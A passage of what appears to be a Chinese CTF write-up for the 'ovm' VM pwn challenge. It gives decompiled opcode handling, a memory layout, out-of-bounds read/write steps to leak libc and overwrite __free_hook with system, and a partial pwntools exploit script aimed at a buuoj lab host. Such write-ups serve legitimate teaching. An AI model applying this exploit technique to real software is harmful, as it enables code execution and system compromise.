HIBYTE(a1) &gt; <span class="hljs-number">0xD0u</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xE0</span> )<br>        &#123;<br>          running = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( !reg[<span class="hljs-number">13</span>] )<br>            <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXIT\n&quot;</span>, <span class="hljs-number">5uLL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) != <span class="hljs-number">0xFF</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        running = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;R%d: %X\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)reg[i]);<span class="hljs-comment">// 打印</span><br>        <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HALT\n&quot;</span>, <span class="hljs-number">5uLL</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xC0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = reg[v3] &lt;&lt; reg[v2];<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x90u</span>:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] &amp; reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA0u</span>:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] | reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x80u</span>:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v3] - reg[v2];<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x30</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = memory[reg[v2]];<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x30u</span> )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x50u</span>:<br>        LODWORD(result) = reg[<span class="hljs-number">13</span>];              <span class="hljs-comment">// 保存栈顶</span><br>        reg[<span class="hljs-number">13</span>] = result + <span class="hljs-number">1</span>;<br>        result = (<span class="hljs-type">int</span>)result;<br>        <span class="hljs-built_in">stack</span>[(<span class="hljs-type">int</span>)result] = reg[v4];           <span class="hljs-comment">// 数据进栈</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x60u</span>:<br>        --reg[<span class="hljs-number">13</span>];<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = <span class="hljs-built_in">stack</span>[reg[<span class="hljs-number">13</span>]];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x40u</span>:<br>        result = (<span class="hljs-type">ssize_t</span>)memory;<br>        memory[reg[v2]] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x10</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (<span class="hljs-type">unsigned</span> __int8)a1;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x20</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (_BYTE)a1 == <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是指令的解析和执行</p><p>解析：</p><p>opcode格式</p><p> 操作码 | 目标寄存器 （v4）| 操作数2寄存器 （v3）| 操作数1寄存器（v2） </p><p>比如0x70020100</p><p>翻译：</p><ul><li>0x70 加法</li><li>v4：2</li><li>v3：1</li><li>v2：0</li><li>操作：reg[2]&#x3D;reg[1]+reg[0]</li></ul><p>然后底下一大段代码就是来执行解析后的代码，结果如下</p><table><thead><tr><th align="left">操作码</th><th>操作</th></tr></thead><tbody><tr><td align="left">0x70</td><td>reg[v4] &#x3D; reg[v2] + reg[v3]</td></tr><tr><td align="left">0xB0</td><td>reg[v4] &#x3D; reg[v2] ^ reg[v3]</td></tr><tr><td align="left">0xD0</td><td>reg[v4] &#x3D; reg[v3] &gt;&gt; reg[v2]</td></tr><tr><td align="left">0xE0</td><td>if !sp 就exit</td></tr><tr><td align="left">0xFF</td><td>nop 打印寄存器</td></tr><tr><td align="left">0xC0</td><td>reg[v4] &#x3D; reg[v3] &lt;&lt; reg[v2]</td></tr><tr><td align="left">0x90</td><td>reg[v4] &#x3D; reg[v2] &amp; reg[v3]</td></tr><tr><td align="left">0xA0</td><td>reg[v4] &#x3D; reg[v2] | reg[v3]</td></tr><tr><td align="left">0x80</td><td>reg[v4] &#x3D; reg[v3] - reg[v2]</td></tr><tr><td align="left">0x30</td><td>reg[v4] &#x3D; memory[reg[v2]]</td></tr><tr><td align="left">0x50(P)</td><td>进栈</td></tr><tr><td align="left">0x60</td><td>出栈</td></tr><tr><td align="left">0x40</td><td>memory[reg[v2]] &#x3D; reg[v4]</td></tr><tr><td align="left">0x10</td><td>reg[v4] &#x3D; (unsigned __int8)a1（a1最低字节）</td></tr><tr><td align="left">0x20</td><td>reg[v4] &#x3D;((_BYTE)a1 &#x3D;&#x3D; 0)</td></tr></tbody></table><p>最后回到main函数有一个写入comment的操作还有sendcomment</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sendcomment</span><span class="hljs-params">(<span class="hljs-type">void</span> *a1)</span><br>&#123;<br>  <span class="hljs-built_in">free</span>(a1);<br>&#125;<br></code></pre></td></tr></table></figure><p>一个free的操作，大致上后面就是改freehook为system然后参数就是comment，待会儿在comment处写&#x2F;bin&#x2F;sh即可</p><p>内存排布</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">.got:<span class="hljs-number">0000000000201F</span>F8 <span class="hljs-number">60</span> <span class="hljs-number">21</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       stderr_ptr dq offset <span class="hljs-built_in">stderr</span>             ; DATA XREF: main+<span class="hljs-number">4</span>D↑r<br>.got:<span class="hljs-number">0000000000201F</span>F8                               _got ends<br>.got:<span class="hljs-number">0000000000201F</span>F8<br>.data:<span class="hljs-number">0000000000202000</span>                               ; ===========================================================================<br>.data:<span class="hljs-number">0000000000202000</span><br>.data:<span class="hljs-number">0000000000202000</span>                               ; Segment type: Pure data<br>.data:<span class="hljs-number">0000000000202000</span>                               ; Segment permissions: Read/Write<br>.data:<span class="hljs-number">0000000000202000</span>                               _data segment qword public <span class="hljs-string">&#x27;DATA&#x27;</span> use64<br>.data:<span class="hljs-number">0000000000202000</span>                               assume cs:_data<br>.data:<span class="hljs-number">0000000000202000</span>                               ;org <span class="hljs-number">202000</span>h<br>.data:<span class="hljs-number">0000000000202000</span>                               public __data_start ; weak<br>.data:<span class="hljs-number">0000000000202000</span> <span class="hljs-number">00</span>                            __data_start db    <span class="hljs-number">0</span>                    ; Alternative name is <span class="hljs-string">&#x27;__data_start&#x27;</span><br>.data:<span class="hljs-number">0000000000202000</span>                                                                       ; data_start<br>.data:<span class="hljs-number">0000000000202001</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202002</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202003</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202004</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202005</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202006</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202007</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0000000000202008</span>                               public __dso_handle<br>.data:<span class="hljs-number">0000000000202008</span>                               ; <span class="hljs-type">void</span> *_dso_handle<br>.data:<span class="hljs-number">0000000000202008</span> <span class="hljs-number">08</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       __dso_handle dq offset __dso_handle     ; DATA XREF: __do_global_dtors_aux+<span class="hljs-number">17</span>↑r<br>.data:<span class="hljs-number">0000000000202008</span>                                                                       ; .data:__dso_handle↓o<br>.data:<span class="hljs-number">0000000000202008</span>                               _data ends<br>.data:<span class="hljs-number">0000000000202008</span><br>LOAD:<span class="hljs-number">0000000000202010</span>                               ; ===========================================================================<br>LOAD:<span class="hljs-number">0000000000202010</span><br>LOAD:<span class="hljs-number">0000000000202010</span>                               ; Segment type: Pure data<br>LOAD:<span class="hljs-number">0000000000202010</span>                               ; Segment permissions: Read/Write<br>LOAD:<span class="hljs-number">0000000000202010</span>                               LOAD segment byte public <span class="hljs-string">&#x27;DATA&#x27;</span> use64<br>LOAD:<span class="hljs-number">0000000000202010</span>                               assume cs:LOAD<br>LOAD:<span class="hljs-number">0000000000202010</span>                               ;org <span class="hljs-number">202010</span>h<br>LOAD:<span class="hljs-number">0000000000202010</span>                               public __bss_start<br>LOAD:<span class="hljs-number">0000000000202010</span> ??                            __bss_start db    ? ;                   ; DATA XREF: LOAD:<span class="hljs-number">00000000000004</span>C0↑o<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; LOAD:<span class="hljs-number">00000000000004F</span>0↑o<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; deregister_tm_clones↑o<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; register_tm_clones↑o<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; register_tm_clones+<span class="hljs-number">7</span>↑o<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; Alternative name is <span class="hljs-string">&#x27;_edata&#x27;</span><br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; __TMC_END__<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; _edata<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; __bss_start<br>LOAD:<span class="hljs-number">0000000000202010</span>                                                                       ; _edata<br>LOAD:<span class="hljs-number">0000000000202011</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202012</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202013</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202014</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202015</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202016</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202017</span> ??                            unk_202017 db    ? ;                    ; DATA XREF: deregister_tm_clones+<span class="hljs-number">7</span>↑o<br>LOAD:<span class="hljs-number">0000000000202018</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">0000000000202019</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201</span>A ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201B</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201</span>C ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201</span>D ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201</span>E ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201F</span> ??                            db    ? ;<br>LOAD:<span class="hljs-number">000000000020201F</span>                               LOAD ends<br>LOAD:<span class="hljs-number">000000000020201F</span><br>.bss:<span class="hljs-number">0000000000202020</span>                               ; ===========================================================================<br>.bss:<span class="hljs-number">0000000000202020</span><br>.bss:<span class="hljs-number">0000000000202020</span>                               ; Segment type: Uninitialized<br>.bss:<span class="hljs-number">0000000000202020</span>                               ; Segment permissions: Read/Write<br>.bss:<span class="hljs-number">0000000000202020</span>                               _bss segment align_32 public <span class="hljs-string">&#x27;BSS&#x27;</span> use64<br>.bss:<span class="hljs-number">0000000000202020</span>                               assume cs:_bss<br>.bss:<span class="hljs-number">0000000000202020</span>                               ;org <span class="hljs-number">202020</span>h<br>.bss:<span class="hljs-number">0000000000202020</span>                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing<br>.bss:<span class="hljs-number">0000000000202020</span> ??                            completed_7594 db ?                     ; DATA XREF: __do_global_dtors_aux↑r<br>.bss:<span class="hljs-number">0000000000202020</span>                                                                       ; __do_global_dtors_aux+<span class="hljs-number">29</span>↑w<br>.bss:<span class="hljs-number">0000000000202021</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">0000000000202040</span>                               public comment<br>.bss:<span class="hljs-number">0000000000202040</span> ??                            comment db    ? ;                       ; DATA XREF: main+<span class="hljs-number">15</span>↑o<br>.bss:<span class="hljs-number">0000000000202040</span>                                                                       ; main+<span class="hljs-number">27</span>E↑o<br>.bss:<span class="hljs-number">0000000000202040</span>                                                                       ; main+<span class="hljs-number">29</span>A↑o<br>.bss:<span class="hljs-number">0000000000202041</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202042</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202043</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202044</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202045</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202046</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202047</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202048</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202049</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204</span>A ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204B</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204</span>C ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204</span>D ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204</span>E ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020204F</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202050</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202051</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202052</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202053</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202054</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202055</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202056</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202057</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202058</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202059</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205</span>A ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205B</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205</span>C ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205</span>D ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205</span>E ??                            db    ? ;<br>.bss:<span class="hljs-number">000000000020205F</span> ??                            db    ? ;<br>.bss:<span class="hljs-number">0000000000202060</span>                               public memory<br>.bss:<span class="hljs-number">0000000000202060</span>                               ; _DWORD memory[<span class="hljs-number">65536</span>]<br>.bss:<span class="hljs-number">0000000000202060</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+memory dd <span class="hljs-number">10000</span>h <span class="hljs-title function_">dup</span><span class="hljs-params">(?)</span>                 ; DATA XREF: fetch+<span class="hljs-number">1B</span>↑o<br></code></pre></td></tr></table></figure><p>由于0x30，0x40对数组下标的解析不规范，我们可以用其来泄露地址和写入地址</p><p>首先泄露stderr，memory是dword类型的数组，一个单位4个字节，所以要到stderr就是(0x202060-0x201ff8)&#x2F;4转换10进制就是26，所以memory[-26]是stderr低字节，memory[-25]是高字节</p><p>然后就是用这个地址搞到free_hook-8，至于偏移是多少，直接脚本里<code>print(hex(libc.sym[&#39;__free\_hook&#39;]-libc.sym[&#39;stderr&#39;]))</code>就可以了，然后这个偏移怎么构造，看底下的就好了</p><p>然后同样方法计算出comment和memory差距，发现memory[-8]是comment低字节，memory[-7]是高字节，写入即可</p><ol><li>泄露stderr</li></ol><ul><li>reg[0]&#x3D;26                                r0&#x3D;26</li><li>reg[1]&#x3D;reg[1]-reg[0]              r1&#x3D;-26</li><li>reg[7]&#x3D;memory[reg[1]]             r7&#x3D;stderr低字节</li><li>reg[0]&#x3D;25                                r0&#x3D;25</li><li>reg[2]&#x3D;reg[2]-reg[0]              r2&#x3D;-25</li><li>r[8]&#x3D;memory[reg[2]]                 r8&#x3D;stderr高字节</li></ul><ol start="2"><li>得到free_hook-8的地址，__free_hook比stderr大0x10a8，我们要得到freehook-8的大小，所以偏移是0x10a0，只要在低字节部分加上0x10a0即是freehook-8的地址</li></ol><ul><li>reg[0]&#x3D;12                                 r0&#x3D;12</li><li>reg[1]&#x3D;1                                    r1&#x3D;1 </li><li>reg[2]&#x3D;reg[1]&lt;&lt;reg[0]             r2&#x3D;1000</li><li>reg[3]&#x3D;0xa0                              r3&#x3D;0xa0</li><li>reg[4]&#x3D;reg[2]+reg[3]               r4&#x3D;0x10a0 偏移构造出来了</li><li>reg[6]&#x3D;reg[4]+reg[7]               r6为free_hook-8低字节</li></ul><ol start="3"><li>将得到的地址写到comment指针里面，分高低字节分别写入memory[-8]&#x3D;r7，memory[-7]&#x3D;r6，然后打印出寄存器，计算出free_hook-8，对应计算出libcbase然后system函数也可以得出</li></ol><ul><li>reg[0]&#x3D;8</li><li>reg[1]&#x3D;0</li><li>reg[1]&#x3D;reg[1]-reg[0]             r1&#x3D;-8</li><li>memory[r[1]]&#x3D;r[7]               memory[-8]&#x3D;r7</li><li>reg[0]&#x3D;7</li><li>reg[1]&#x3D;0</li><li>reg[1]&#x3D;reg[1]-reg[0]             r1&#x3D;-7</li><li>memory[[r1]]&#x3D;r[6]               memory[-7]&#x3D;r6</li><li>0xff</li></ul><ol start="4"><li>由于comment被我们改成了free_hook-8，我们在最后输入comment的时候就输入b’&#x2F;bin&#x2F;sh\x00’+p64(system)即可</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment"># r=process(&#x27;./ovm&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27431</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode</span>(<span class="hljs-params">code,v4,v3,v2</span>):<br>    res=code&lt;&lt;<span class="hljs-number">24</span><br>    res+=v4&lt;&lt;<span class="hljs-number">16</span><br>    res+=v3&lt;&lt;<span class="hljs-number">8</span><br>    res+=v2<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res)<br>r.sendlineafter(<span class="hljs-string">&quot;PC: &quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&quot;21&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x70reg[v4] = reg[v2] + reg[v3]</span><br><span class="hljs-string">0xB0reg[v4] = reg[v2] ^ reg[v3]</span><br><span class="hljs-string">0xD0reg[v4] = reg[v3] &gt;&gt; reg[v2]</span><br><span class="hljs-string">0xE0if !sp 就exit</span><br><span class="hljs-string">0xFFnop</span><br><span class="hljs-string">0xC0reg[v4] = reg[v3] &lt;&lt; reg[v2]</span><br><span class="hljs-string">0x90reg[v4] = reg[v2] &amp; reg[v3]</span><br><span class="hljs-string">0xA0reg[v4] = reg[v2] | reg[v3]</span><br><span class="hljs-string">0x80reg[v4] = reg[v3] - reg[v2]</span><br><span class="hljs-string">0x30reg[v4] = memory[reg[v2]]</span><br><span class="hljs-string">0x50(P)进栈0x60出栈</span><br><span class="hljs-string">0x40memory[reg[v2]] = reg[v4]</span><br><span class="hljs-string">0x10reg[v4] = (unsigned __int8)a1（a1最低字节）</span><br><span class="hljs-string">0x20reg[v4] =((_BYTE)a1 == 0)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>))<br>r.sendline(opcode(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x30</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>))<br>r.sendline(opcode(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x30</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>))<br><br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>r.sendline(opcode(<span class="hljs-number">0xc0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x70</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>))<br>r.sendline(opcode(<span class="hljs-number">0x70</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>))<br><br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x40</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>))<br>r.sendline(opcode(<span class="hljs-number">0x10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>r.sendline(opcode(<span class="hljs-number">0x40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>r.sendline(opcode(<span class="hljs-number">0xff</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br><span class="hljs-comment"># r6 low freehook-8</span><br><span class="hljs-comment"># r8 high freehook-8</span><br><br>r.recvuntil(<span 